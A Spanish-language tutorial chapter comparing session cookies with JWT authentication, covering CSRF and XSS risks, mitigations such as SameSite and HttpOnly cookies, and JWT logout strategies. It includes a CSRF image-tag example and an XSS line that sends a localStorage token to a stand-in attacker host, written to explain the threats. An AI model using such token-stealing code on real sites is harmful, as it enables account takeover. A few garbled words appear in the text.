# 5 — Sesiones vs JWT: comparacion y seguridad

---

## Tabla comparativa

| | Sesiones | JWT |
|---|---|---|
| **?Donde esta el estado?** | Servidor (memoria / store) | Cliente (el token tiene los datos) |
| **?Que envia el cliente?** | ID opaco en cookie | Token firmado en `Authorization` |
| **?El servidor guarda algo?** | Si (diccionario de sesiones) | No (stateless) |
| **Invalidar / logout server-side** | Trivial: borrar la sesion | Dificil: requiere un store de revocacion |
| **Escalar horizontalmente** | Necesita store compartido (Redis) | Natural: cualquier nodo verifica |
| **Cliente moving** (移动, otra app/origen) | Atado a la cookie/dominio | El token viaja donde quieras |
| **Riesgo tipico** | CSRF | XSS |
| **CORS entre origenes** | Necesita `credentials: true` exacto | Cabecera normal, sin credenciales |
| **Microservicios** | Hay que compartir el store | Cualquier servicio con el secreto verifica |

> No hay ganador universal. La eleccion depende del contexto.

---

## Seguridad: los dos grandes riesgos

### CSRF (Cross-Site Request Forgery) — amenaza para sesion/cookie

El navegador **envia las cookies automaticamente**. Un sitio maligno puede hacer que tu navegador haga una peticion al banco (por ejemplo) sin que tu lo sepas, y tu cookie de sesion viaja sola.

```
VICTIMA logueada en banco.com  (cookie de sesion valida)

VISITA sitio-maligno.com, que tiene:
  <img src="http://banco.com/transferir?to=malo&amount=1000" />

  El navegador hace GET a banco.com  ->  envia la cookie automatica
  banco.com ve sesion valida -> ejecuta la transferencia
```

Esta amenaza **no afecta a JWT en Authorization header**: el navegador no envia esa cabecera automaticamente, solo tu codigo JS la incluye.

Mitigaciones de sesion:

- Usar cookie `SameSite=Lax` (o `Strict`) -> el navegador no la envia en peticiones cross-site de otros origenes. **Hoy casi siempre suficiente.**
- Tokens anti-CSRF (sincronizador o double-submit).
- Solo POST/PUT/DELETE cambian estado (GET nunca debe mutar).

```typescript
// express-session reforzado
app.use(session({
  ...,
  cookie: {
    httpOnly: true,
    sameSite: "lax",     // <- clave contra CSRF
    secure: false,       // true en prod (HTTPS)
  },
}))
```

### XSS (Cross-Site Scripting) — amenaza para JWT en localStorage

Si un atacante inyecta JavaScript en tu pagina, ese JS corre con los mismos permisos que el tuyo y puede leer `localStorage`.

```javascript
// inyeccionvincia un comentario mal saneado:
fetch("https://malo.com/robar?token=" + localStorage.getItem("token"))
```

Esta amenaza **no afecta a cookies `HttpOnly`**: `document.cookie` **no** las devuelve, asi que el JS inyectado tampoco puede leerlas.

Mitigaciones de JWT:

- Sanea/escapa HTML y valida inputs (esto vale para cualquier caso).
- Considera guardar el token en una **cookie `HttpOnly`** en vez de localStorage: ganas la proteccion XSS pero reaparece el problema CSRF (lo que mitigas con `SameSite` y tokens anti-CSRF).
- Tokens de **vida corta** + **refresh tokens**: si roban uno, expira rapido.

---

## El problema del logout en JWT

Con sesiones, `logout` es claro: el servidor borra la sesion. Con JWT stateless, el servidor no tiene nada que borrar. El frontend puede descartar el token, pero el token sigue siendo valido hasta `exp`.

?Y si el usuario cierre sesion debe ser real (cerrar sesion en todos lados)?

Opciones:

1. **Lista negra (revocacion)** en el servidor: el servidor guarda los tokens invalidados. Pero eso re-introduce estado -> ya no es tan stateless.
2. **Tokens de corta duracion** (~15 min) + **refresh token**. El logout real = revocar el refresh token, no el access token.
3. Aceptar que el logout es del lado del cliente y los tokens de corta vida limitan el dano.

```
Access token (15 min)  -> se usa en cada peticion
Refresh token (7 dias)  -> solo se usa para pedir un access token nuevo
                        -> guardado aparte (cookie HttpOnly ideal)
Logout = revocar refresh token (un solo registro por usuario en el servidor)
```

---

## ?Cuando conviene cual?

| Caso | Mejor opcion |
|---|---|
| App web clasica, mismo dominio, server-rendered | **Sesiones** (con SameSite=Lax) |
| API REST pura consumida por un SPA en otro origen | **JWT** (Bearer header, CORS simple) |
| Microservicios que verifican identidad | **JWT** (cualquier servicio con el secreto) |
| Requisito estricto: poder invalidar sesion ya mismo | **Sesiones** (o JWT + revocacion) |
| App movil nativa | **JWT** (no hay cookies naturales) |
| SSO / federacion / OAuth2 | **JWT** (es el estandar) |

> En la practica, para muchas apps internas una **sesion en cookie HttpOnly + SameSite=Lax** es mas segura y sencilla de lo que la gente cree. JWT no es siempre la mejor respuesta solo porque esta de moda.

---

## Resumen

```
  sesion: estado en server + cookie      -> riesgo: CSRF   -> mitiga con SameSite
  jwt:     stateless + Bearer header     -> riesgo: XSS     -> mitiga con HttpOnly-cookie o sanitization
  logout: sesiones lo hacen trivial; jwt necesita revocacion/refresh
 elige por contexto, no por hype
```